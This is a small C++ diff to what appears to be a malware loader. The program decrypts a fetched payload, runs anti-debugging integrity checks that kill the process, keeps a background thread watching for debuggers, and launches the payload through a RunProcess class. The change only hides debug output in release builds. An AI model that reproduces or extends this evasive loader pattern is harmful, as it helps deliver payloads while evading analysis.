@@ -37,7 +37,10 @@ int main() {
     vector<BYTE>* dPayload = payloadManager->GetDecryptedPayload(response);
 
     antiDbg.KillIfIntegrityCheckFails();
+
+#ifdef _DEBUG
     cout << dPayload->data()[0] << dPayload->data()[1] << dPayload->data()[2] << endl;
+#endif // _DEBUG
 
     antiDbg.KillIfIntegrityCheckFails();
     RunProcess* runProcess = new RunProcess();
@@ -45,7 +48,9 @@ int main() {
 
     thread checkIntegrity = thread([&antiDbg]() {
         while (true) {
+#ifdef _DEBUG
             cout << "Integrity check..." << endl;
+#endif // _DEBUG
             antiDbg.KillIfIntegrityCheckFails();
             Sleep(1000);
         }
@@ -56,6 +61,7 @@ int main() {
 
     delete payloadManager;
     delete runProcess;
+
     checkIntegrity.join();
 
     return 0;
